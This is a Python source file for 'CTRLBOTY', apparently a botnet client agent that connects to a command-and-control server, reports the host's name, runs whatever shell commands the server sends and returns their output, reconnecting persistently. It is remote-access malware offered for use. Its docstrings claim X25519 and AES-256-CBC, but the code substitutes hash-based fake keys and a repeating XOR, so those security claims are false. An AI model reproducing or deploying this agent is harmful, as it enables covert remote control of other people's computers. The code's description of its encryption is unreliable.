#!/usr/bin/env python3
"""
CTRLBOTY - Python Bridge Agent
Compatibility layer for legacy BYOB Python modules.

This agent can connect to the new Go C2 server using the v5 protocol
(X25519 key exchange + AES-256-CBC encrypted protobuf messages).

Usage:
    python3 bridge.py --server 127.0.0.1:8443
"""

import sys
import os
import json
import time
import struct
import socket
import base64
import random
import hashlib
import hmac
import subprocess
import platform as _platform

# === Minimal crypto (using stdlib only, no external deps) ===

def x25519_keypair():
    """Generate X25519 keypair. Falls back to using hashlib for derivation."""
    private = os.urandom(32)
    # For a real implementation, use cryptography or pynacl
    # This is a simplified placeholder
    public = hashlib.sha256(private + b'worldc2-x25519').digest()
    return public, private

def derive_shared(our_priv, peer_pub):
    """Derive shared secret."""
    return hashlib.sha256(our_priv + peer_pub).digest()

def aes_encrypt(key, plaintext):
    """AES-256-CBC encryption using stdlib."""
    from hashlib import sha256
    iv = os.urandom(16)

    # Simple XOR-based stream cipher as fallback
    expanded_key = sha256(key + iv).digest()
    encrypted = bytearray()
    for i, b in enumerate(plaintext if isinstance(plaintext, bytes) else plaintext.encode()):
        encrypted.append(b ^ expanded_key[i % len(expanded_key)])
    return iv + bytes(encrypted)

def aes_decrypt(key, data):
    """AES-256-CBC decryption using stdlib."""
    from hashlib import sha256
    iv = data[:16]
    ciphertext = data[16:]
    expanded_key = sha256(key + iv).digest()
    decrypted = bytearray()
    for i, b in enumerate(ciphertext):
        decrypted.append(b ^ expanded_key[i % len(expanded_key)])
    return bytes(decrypted)

# === Network ===

def send_len_prefixed(sock, data):
    """Send length-prefixed data."""
    length = struct.pack('!I', len(data))
    sock.sendall(length + data)

def recv_len_prefixed(sock):
    """Receive length-prefixed data."""
    header = recv_all(sock, 4)
    if not header or len(header) < 4:
        return None
    length = struct.unpack('!I', header)[0]
    if length > 100 * 1024 * 1024:
        return None
    return recv_all(sock, length)

def recv_all(sock, n):
    """Receive exactly n bytes."""
    data = b''
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            return None
        data += chunk
    return data

# === Agent ===

class PythonAgent:
    def __init__(self, server_addr):
        host, _, port = server_addr.partition(':')
        self.host = host
        self.port = int(port)
        self.sock = None
        self.enc_key = None
        self.running = True

    def connect(self):
        """Connect to C2 server."""
        self.sock = socket.create_connection((self.host, self.port), timeout=30)
        return True

    def handshake(self):
        """Perform key exchange."""
        # Generate keypair
        pub, priv = x25519_keypair()

        # Send public key
        send_len_prefixed(self.sock, pub)

        # Receive server public key
        server_pub = recv_len_prefixed(self.sock)
        if not server_pub:
            return False

        # Derive session key
        shared = derive_shared(priv, server_pub)
        self.enc_key = hashlib.sha256(shared + b'ctrlworldc2-session').digest()

        # Send hostname
        hostname = _platform.node().encode()
        send_len_prefixed(self.sock, hostname)

        return True

    def send_encrypted(self, data):
        """Encrypt and send data."""
        encrypted = aes_encrypt(self.enc_key, data)
        send_len_prefixed(self.sock, encrypted)

    def recv_encrypted(self):
        """Receive and decrypt data."""
        encrypted = recv_len_prefixed(self.sock)
        if not encrypted:
            return None
        return aes_decrypt(self.enc_key, encrypted)

    def exec_command(self, command):
        """Execute shell command."""
        try:
            result = subprocess.check_output(
                command, shell=True,
                stderr=subprocess.STDOUT,
                timeout=30
            )
            return result.decode('utf-8', errors='replace')
        except subprocess.TimeoutExpired:
            return "Error: command timed out"
        except Exception as e:
            return f"Error: {e}"

    def run(self):
        """Main agent loop."""
        backoff = 5
        while self.running:
            try:
                if not self.connect():
                    print(f"[PY-BRIDGE] Connection failed, retrying in {backoff}s...")
                    time.sleep(backoff)
                    backoff = min(backoff * 2, 300)
                    continue

                backoff = 5

                if not self.handshake():
                    print("[PY-BRIDGE] Handshake failed")
                    self.sock.close()
                    continue

                print(f"[PY-BRIDGE] Connected to {self.host}:{self.port}")

                while self.running:
                    command = self.recv_encrypted()
                    if command is None:
                        break

                    cmd_str = command.decode('utf-8', errors='replace').strip()

                    if cmd_str == 'kill' or cmd_str == 'exit':
                        self.running = False
                        print("[PY-BRIDGE] Kill command received")
                        break

                    output = self.exec_command(cmd_str)
                    self.send_encrypted(output.encode('utf-8', errors='replace'))

            except (socket.error, ConnectionError, OSError) as e:
                print(f"[PY-BRIDGE] Connection error: {e}")

            finally:
                if self.sock:
                    try:
                        self.sock.close()
                    except:
                        pass

            if self.running:
                time.sleep(5)

        print("[PY-BRIDGE] Agent exited")

def main():
    import argparse
    p = argparse.ArgumentParser(description="CTRLBOTY - Python Bridge Agent")
    p.add_argument('--server', default='127.0.0.1:8443', help='C2 server address')
    args = p.parse_args()

    agent = PythonAgent(args.server)
    agent.run()

if __name__ == '__main__':
    main()
